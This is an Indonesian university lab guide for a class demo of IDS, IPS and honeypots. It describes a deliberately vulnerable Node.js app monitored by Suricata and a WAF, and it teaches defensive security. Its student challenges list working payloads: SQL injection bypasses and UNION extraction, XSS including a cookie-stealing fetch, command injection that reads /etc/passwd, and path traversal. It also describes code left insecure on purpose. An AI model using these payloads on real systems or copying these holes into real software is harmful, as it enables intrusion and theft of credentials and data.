# Panduan Praktik: IDS, IPS, dan Honeypot
**PT. Baroque-ah — Demo Security Lab**
Mata Kuliah: Server & Network Administration — Semester 4

---

## Daftar Isi

1. [Konsep Dasar](#1-konsep-dasar)
2. [Arsitektur Sistem](#2-arsitektur-sistem)
3. [Setup & Deployment](#3-setup--deployment)
4. [Panduan Peserta — 6 Tantangan](#4-panduan-peserta--6-tantangan)
5. [Panduan Presenter — Monitor & Reset](#5-panduan-presenter--monitor--reset)
6. [Cara Kerja Deteksi (Penjelasan Teknis)](#6-cara-kerja-deteksi-penjelasan-teknis)
7. [Skenario Demo Live](#7-skenario-demo-live)
8. [Troubleshooting](#8-troubleshooting)

---

## 1. Konsep Dasar

### Intrusion Detection System (IDS)
IDS adalah sistem yang **memantau** lalu lintas jaringan atau aktivitas sistem untuk mendeteksi pola serangan, lalu **mencatat** (log) dan **memberi peringatan** — tanpa memblokir.

> Analogi: CCTV. Merekam apa yang terjadi, tapi tidak menghalangi pencuri masuk.

Dalam lab ini, IDS diimplementasikan oleh **Suricata** yang membaca semua paket HTTP di level jaringan dan memunculkan alert di monitor (label biru **SURICATA**).

### Intrusion Prevention System (IPS)
IPS adalah IDS yang ditambah kemampuan **memblokir** traffic berbahaya secara aktif sebelum mencapai aplikasi.

> Analogi: Satpam. Bukan hanya merekam, tapi juga menghadang.

Dalam lab ini, IPS diimplementasikan oleh **App WAF** (Web Application Firewall) di layer aplikasi. Bisa dijalankan dalam dua mode:

| Mode | Perilaku |
|------|----------|
| `detect` | Catat serangan, teruskan request ke aplikasi (IDS-like) |
| `block`  | Catat serangan, **blokir** request — kirim halaman 403 merah |

### Honeypot
Honeypot adalah jebakan berupa aset palsu yang terlihat menarik bagi penyerang (folder backup, halaman admin tersembunyi). **Tidak ada pengguna sah yang punya alasan untuk mengaksesnya** — sehingga setiap akses = 100% anomali, 0 false positive.

> Analogi: Dompet palsu yang ditaruh terlihat di meja. Siapa pun yang menyentuhnya pasti pencuri.

Dalam lab ini, honeypot adalah rute `/admin-backup` dan `/secret-login` yang diiklankan di `robots.txt` dan komentar HTML tersembunyi.

---

## 2. Arsitektur Sistem

```
Internet / Browser Peserta
          │
          ▼ HTTP port 80
┌─────────────────────────────┐
│         Docker Host (VPS)   │
│                             │
│  ┌──────────────────────┐   │
│  │  Suricata (IDS)      │   │  ← Baca semua paket HTTP via AF_PACKET
│  │  network_mode: host  │   │    Alert → eve.json
│  └──────────┬───────────┘   │
│             │ eve.json       │
│  ┌──────────▼───────────┐   │
│  │  App Container       │   │
│  │  Node.js / Express   │   │
│  │                      │   │
│  │  [WAF Middleware]     │   │  ← Lapisan 1: App WAF (orange)
│  │    ↓ detect / block   │   │
│  │  [Vulnerable Routes] │   │  ← /login /comments /search /tools /view
│  │  [Honeypot Routes]   │   │  ← /admin-backup /secret-login (red)
│  │  [Eve Tailer]        │   │  ← Baca eve.json Suricata → emit ke monitor
│  └──────────┬───────────┘   │
│             │                │
│  ┌──────────▼───────────┐   │
│  │  MySQL 8             │   │  ← Simpan events, users, comments
│  └──────────────────────┘   │
│                             │
│  ┌──────────────────────┐   │
│  │  EveBox :5636        │   │  ← Dashboard Suricata (akses via SSH tunnel)
│  └──────────────────────┘   │
└─────────────────────────────┘
```

### Tiga Lapisan Deteksi

```
Request masuk
    │
    ├─► [Suricata IDS]     — network level, label CYAN di monitor
    │
    ├─► [App WAF]          — application level, label ORANGE di monitor
    │       ├─ detect: log + lanjut ke endpoint
    │       └─ block:  log + balik 403 merah
    │
    └─► [Endpoint]
            ├─ Vulnerable routes: proses normal (sengaja)
            └─ Honeypot routes:  log + tampilkan halaman fake, label RED
```

---

## 3. Setup & Deployment

### Prasyarat
- VPS dengan Linux (Ubuntu 22.04 / Debian 12 direkomendasikan)
- Docker + Docker Compose v2 terinstall
- Port 80 terbuka di firewall

### Langkah Deploy

**1. Clone repo dan masuk ke folder:**
```bash
git clone <repo-url> baroque-ah
cd baroque-ah
```

**2. Buat file `.env`:**
```bash
cat > .env << 'EOF'
DB_USER=demo
DB_PASS=demo123
DB_NAME=demoids
DB_ROOT_PASS=rootpass123
SESSION_SECRET=ubah-ini-ke-random-string-panjang
MONITOR_TOKEN=token-rahasia-presenter-saja
WAF_MODE=detect
SURICATA_INTERFACE=eth0
EOF
```

> Ganti `SURICATA_INTERFACE` dengan interface yang benar. Cek dengan: `ip addr`

**3. Sesuaikan port Suricata** di `suricata/custom.rules` jika app tidak di port 80:
```bash
# Jika VPS pakai Nginx reverse proxy ke port 3000, ganti -> any 80 jadi -> any 3000
```

**4. Jalankan:**
```bash
docker compose up -d
```

**5. Cek status:**
```bash
docker compose ps
docker compose logs -f app      # log aplikasi
docker compose logs -f suricata # log Suricata
```

**6. Verifikasi:**
- App: `http://IP_VPS/`
- Monitor: `http://IP_VPS/monitor?token=TOKEN_RAHASIA`
- Test Suricata dummy: `http://IP_VPS/api/test-suricata?token=TOKEN_RAHASIA&count=3`

### Reset Data Sebelum Sesi Baru
Buka monitor → klik tombol **Reset** (kanan atas) → konfirmasi. Semua events, komentar, dan leaderboard terhapus serentak di semua tab monitor.

Atau via curl:
```bash
curl -X POST "http://IP_VPS/api/reset?token=TOKEN_RAHASIA"
```

---

## 4. Panduan Peserta — 6 Tantangan

Buka `http://IP_VPS/` → masukkan nickname → klik **Mulai Serang** → buka `/play` untuk melihat daftar tantangan.

---

### Tantangan 1 — SQL Injection (Login Bypass)
**Halaman:** `/login`
**Tujuan:** Masuk tanpa tahu password dengan memanipulasi query SQL.

**Cara kerja:**
Server membangun query seperti ini:
```sql
SELECT * FROM users WHERE username='INPUT' AND password='INPUT'
```
Karena input tidak di-sanitasi, kita bisa menyuntikkan SQL.

**Payload untuk dicoba:**

| Username | Password | Efek |
|----------|----------|------|
| `' OR '1'='1' --` | *(kosong)* | Bypass — kondisi selalu TRUE, login sebagai user pertama |
| `admin' --` | *(kosong)* | Login sebagai admin langsung |
| `admin` | `' OR '1'='1` | Bypass via kolom password |

**Apa yang terjadi:**
- WAF mendeteksi pola SQLi → event muncul di monitor (orange)
- Suricata ikut alert jika payload lewat via POST body (cyan)
- Jika berhasil login sebagai admin → lihat `secret_flag` di halaman hasil: `FLAG{sql_injection_berhasil_kamu_hebat}`

---

### Tantangan 2 — SQL Injection (UNION SELECT)
**Halaman:** `/search`
**Tujuan:** Ekstrak data dari tabel lain menggunakan UNION SELECT.

**Cara kerja:**
Query di server:
```sql
SELECT * FROM comments WHERE body LIKE '%INPUT%'
```

**Payload:**
```
' UNION SELECT 1,username,secret_flag,4 FROM users--
```

**Langkah:**
1. Buka `/search`
2. Ketik payload di kolom pencarian
3. Tekan Enter
4. Lihat hasil — baris tambahan berisi username dan flag dari tabel `users`

**Hasil yang diharapkan:** Terlihat `admin | FLAG{sql_injection_berhasil_kamu_hebat}` di hasil pencarian.

> Catatan: kolom tabel `comments` ada 4 kolom (id, nickname, body, created_at). UNION harus matching jumlah kolomnya.

---

### Tantangan 3 — Stored XSS
**Halaman:** `/comments`
**Tujuan:** Simpan script berbahaya yang akan dieksekusi oleh siapa pun yang membuka halaman komentar.

**Cara kerja:**
Server menyimpan komentar apa adanya ke database tanpa sanitasi. Saat halaman dibuka, komentar ditampilkan dengan `<%- body %>` (unescaped).

**Payload:**
```html
<script>alert('XSS dari ' + document.cookie)</script>
```

```html
<img src=x onerror="document.body.style.background='red'">
```

```html
<script>fetch('/api/steal?c='+document.cookie)</script>
```

**Langkah:**
1. Buka `/comments`
2. Ketik payload di kolom komentar
3. Submit
4. Halaman reload — script langsung berjalan
5. Setiap orang yang membuka `/comments` juga akan kena script ini

**Bahaya nyata:** Attacker bisa mencuri session cookie semua pengguna yang membuka halaman tersebut (session hijacking).

---

### Tantangan 4 — Reflected XSS
**Halaman:** `/search`
**Tujuan:** Eksekusi script lewat parameter URL — tidak disimpan di server.

**Cara kerja:**
Server mengembalikan nilai parameter `q` langsung ke halaman tanpa escaping.

**Payload (ketik di kolom search):**
```html
<script>alert('Reflected XSS!')</script>
```

```html
<img src=x onerror=alert(document.domain)>
```

**Atau akses langsung via URL:**
```
/search?q=<script>alert(1)</script>
```

**Perbedaan dengan Stored XSS:** Payload ini tidak tersimpan di database — hanya aktif untuk URL tertentu. Biasa digunakan untuk serangan phishing (kirim link berbahaya ke korban).

---

### Tantangan 5 — Command Injection
**Halaman:** `/tools` (fitur ping)
**Tujuan:** Jalankan perintah sistem selain ping.

**Cara kerja:**
Server menjalankan:
```bash
ping -c 2 INPUT
```
di dalam shell. Karena tidak ada validasi, karakter shell seperti `;` `|` `&&` bisa menyuntikkan perintah tambahan.

**Payload:**

| Input | Perintah yang dijalankan |
|-------|--------------------------|
| `127.0.0.1; id` | ping + tampilkan user (uid=0/root) |
| `127.0.0.1; cat /etc/passwd` | ping + baca file passwd |
| `127.0.0.1 \| whoami` | abaikan ping, jalankan whoami |
| `127.0.0.1; ls /app` | ping + list file aplikasi |
| `127.0.0.1; cat /app/server.js` | ping + baca source code app |
| `127.0.0.1 && cat /etc/hostname` | ping berhasil dulu, lalu baca hostname |

**Catatan:** Perintah berjalan di dalam container Docker, bukan langsung di VPS host. Tapi tetap sangat berbahaya di dunia nyata.

---

### Tantangan 6 — Honeypot
**Halaman:** `/admin-backup` atau `/secret-login`
**Tujuan:** Temukan halaman tersembunyi dan coba akses — ini adalah jebakan.

**Cara menemukan bait:**
1. Buka `http://IP_VPS/robots.txt` → lihat daftar `Disallow`
2. Atau lihat source code halaman utama (klik kanan → View Page Source) → ada komentar `<!-- TODO: hapus login lama di /secret-login -->`
3. Atau eksploitasi Path Traversal dulu: `/view?file=../../etc/robots.txt`

**Yang terjadi saat diakses:**
- Halaman menampilkan form login admin yang meyakinkan (tapi palsu)
- Setiap akses langsung tercatat sebagai **HONEYPOT** di monitor (merah) — 0 false positive
- Apapun yang diketik di form dicatat (termasuk username/password yang dicoba)

**Pelajaran:** Honeypot efektif karena tidak ada alasan sah untuk mengakses halaman ini. Teknik ini digunakan oleh perusahaan nyata untuk mendeteksi attacker internal maupun eksternal.

---

## 5. Panduan Presenter — Monitor & Reset

### Membuka Monitor
```
http://IP_VPS/monitor?token=TOKEN_RAHASIA
```
Monitor bisa dibuka di banyak tab/layar sekaligus — semua sinkron real-time via Socket.io.

### Tampilan Monitor

```
┌──────────────────────────────────────────────────────────┐
│ Logo  │ TOTAL 12 │ PESERTA 8 │ SQLi 3│XSS 4│PATH 1│... │
│       │                                      │ LIVE ● │Reset│
├─────────────────────────────────┬────────────────────────┤
│  LIVE EVENT FEED                │  LEADERBOARD           │
│                                 │                        │
│  ┌─────────────────────────┐   │  🥇 udin          7    │
│  │ APP·WAF  SQL Injection  │   │  🥈 hacker        4    │
│  │ HIGH  14:23:01          │   │  🥉 noob          2    │
│  │ 👤 udin  POST /login    │   │                        │
│  │ ' OR '1'='1' --         │   │                        │
│  └─────────────────────────┘   │                        │
│                                 │                        │
│  ┌─────────────────────────┐   │                        │
│  │ SURICATA  SQLi detected │   │                        │
│  │ HIGH  14:23:01          │   │                        │
│  └─────────────────────────┘   │                        │
└─────────────────────────────────┴────────────────────────┘
```

### Warna Label Layer

| Warna | Label | Arti |
|-------|-------|------|
| 🟠 Orange | `APP · WAF` | Terdeteksi oleh WAF middleware di aplikasi |
| 🔴 Merah | `HONEYPOT` | Akses ke jebakan honeypot |
| 🔵 Cyan | `SURICATA` | Terdeteksi oleh Suricata di level jaringan |

### Demo Live WAF Mode

**Ganti mode WAF tanpa rebuild:**
```bash
# Mode detect: catat tapi tidak blokir (default)
docker compose exec app sh -c "WAF_MODE=detect node server.js"

# Cara lebih mudah: edit .env lalu restart
# .env: WAF_MODE=block
docker compose up -d app
```

Atau demo langsung: ubah `WAF_MODE=block` di `.env`, rebuild app container, tunjukkan perbedaannya — peserta sekarang dapat halaman merah saat menyerang.

### Reset Semua Data
Klik tombol **Reset** di pojok kanan atas monitor → muncul dialog konfirmasi → klik **Ya, Reset**.

Yang terhapus:
- Semua events di database
- Semua komentar (termasuk XSS payload tersimpan)
- Leaderboard di semua tab monitor direset serentak

Reset tidak bisa dilakukan peserta karena butuh token yang sama dengan token monitor.

### Test Suricata (tanpa serangan nyata)
Untuk demo bahwa Suricata aktif tanpa harus menunggu peserta:
```
http://IP_VPS/api/test-suricata?token=TOKEN_RAHASIA&count=5
```
Ini menginjeksi 5 event Suricata dummy langsung ke monitor.

---

## 6. Cara Kerja Deteksi (Penjelasan Teknis)

### App WAF (`lib/waf.js`)

WAF membaca semua parameter request (query string, body, URL params) dan mencocokkan dengan pola regex:

| Pola | Deteksi |
|------|---------|
| `UNION SELECT`, `OR '1'='1'`, `'--` | SQL Injection |
| `<script>`, `onerror=`, `javascript:` | XSS |
| `../`, `../../etc/passwd` | Path Traversal |
| `; cmd`, `\| cmd`, `&& cmd` | Command Injection |

**Mode detect:** Log event ke DB + emit ke monitor, request tetap dilanjutkan ke endpoint.
**Mode block:** Log event ke DB + emit ke monitor, request dihentikan, tampilkan halaman 403.

Kode endpoint yang rentan **tidak dimodifikasi sama sekali** — WAF bekerja di middleware layer terpisah.

### Suricata IDS (`suricata/custom.rules`)

Suricata berjalan di `network_mode: host` sehingga bisa membaca semua paket di interface jaringan VPS menggunakan AF_PACKET (zero-copy packet capture).

10 custom rules mendeteksi SQLi, XSS, path traversal, command injection, dan akses honeypot di level HTTP request.

Alert ditulis ke `eve.json` dalam format JSON. Aplikasi membaca file ini setiap 1 detik (polling) dan memancarkan event ke monitor.

**Mengapa dua lapisan (WAF + Suricata)?**
- WAF bisa tertipu jika attacker memakai HTTPS (traffic terenkripsi, Suricata tidak bisa baca)
- Suricata bisa mendeteksi serangan yang lolos dari WAF (pola yang berbeda)
- Di lingkungan nyata, kombinasi keduanya memberikan defense-in-depth

### Honeypot (`server.js`)

Dua route `/admin-backup` dan `/secret-login` tidak punya fungsi sah. Setiap akses — GET atau POST — langsung dicatat sebagai `honeypot_access` dengan severity `high`.

Jika attacker mengisi form dengan username/password, kredensial tersebut juga dicatat dan ditampilkan di monitor (berguna untuk melihat teknik attacker).

**Zero false positive:** Tidak ada pengguna normal yang punya alasan ke halaman ini. Bait dipasang di:
- `robots.txt`: `Disallow: /admin-backup`
- Komentar HTML di index: `<!-- TODO: hapus login lama di /secret-login -->`

---

## 7. Skenario Demo Live

### Rekomendasi Urutan Presentasi (45 menit)

| Waktu | Aktivitas |
|-------|-----------|
| 0:00 | Buka monitor di layar presenter. Peserta masukkan nickname. |
| 0:05 | **Konsep** — jelaskan IDS vs IPS vs Honeypot (gunakan analogi di bagian 1) |
| 0:10 | **Demo SQLi** — presenter live demo bypass login + UNION SELECT. Monitor menyala. |
| 0:15 | **Free play peserta** — biarkan semua coba serangan. Monitor ramai. |
| 0:25 | **Demo honeypot** — tunjukkan `robots.txt`, minta 1-2 peserta coba akses `/admin-backup` |
| 0:30 | **Demo WAF block mode** — ganti WAF_MODE=block, rebuild, tunjukkan perbedaan respon |
| 0:35 | **Diskusi** — apa yang bisa lolos? Kenapa Suricata beda dengan WAF? |
| 0:40 | **Reset** → babak kedua atau kompetisi leaderboard |
| 0:45 | Selesai |

### Tips Presenter
- Tampilkan monitor di layar besar sejak awal agar peserta tahu serangan mereka terdeteksi
- Ingatkan peserta bahwa payload mereka bisa terlihat semua orang (motivasi untuk berkreasi)
- Jika ada yang bertanya "kenapa serangan tetap berhasil?": jelaskan WAF mode `detect` vs `block`
- Gunakan `/api/test-suricata` untuk demo Suricata jika setup jaringan tidak memungkinkan rules aktif

---

## 8. Troubleshooting

### Monitor error / tidak mau buka
```bash
docker compose logs app --tail=50
```
Cek apakah `MONITOR_TOKEN` sudah di-set di `.env`.

### Suricata tidak muncul di monitor (label cyan tidak ada)
```bash
docker compose logs suricata --tail=30
```
Kemungkinan penyebab:
- Interface salah → cek `SURICATA_INTERFACE` di `.env`
- Traffic tidak lewat interface tersebut (VPS pakai `ens3`, bukan `eth0`)
- Port di rules tidak cocok (rules default: port 80)

Gunakan endpoint test sebagai workaround:
```
/api/test-suricata?token=TOKEN&count=3
```

### Reset tidak bisa / error 401
Pastikan token di URL sama persis dengan `MONITOR_TOKEN` di `.env`. Token case-sensitive.

### Komentar XSS lama masih tersimpan
Tekan tombol Reset di monitor. Ini menghapus semua komentar termasuk payload XSS tersimpan.

### Container app crash loop
```bash
docker compose logs app
```
Biasanya: DB belum siap. Tunggu 30 detik lalu:
```bash
docker compose restart app
```

### Rebuild setelah mengubah kode
```bash
docker compose up -d --build app
```

---

*Dibuat untuk demo kelas Server & Network Administration — BINUS Semester 4*
